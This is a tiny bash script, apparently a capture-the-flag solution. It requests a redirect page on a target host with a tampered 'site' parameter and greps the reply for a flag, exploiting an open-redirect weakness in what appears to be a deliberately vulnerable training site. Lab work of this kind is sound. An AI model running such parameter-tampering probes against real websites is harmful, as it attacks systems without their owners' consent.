#!/bin/bash
curl "http://$IP/index.php?page=redirect&site=gopa" | grep -i flag
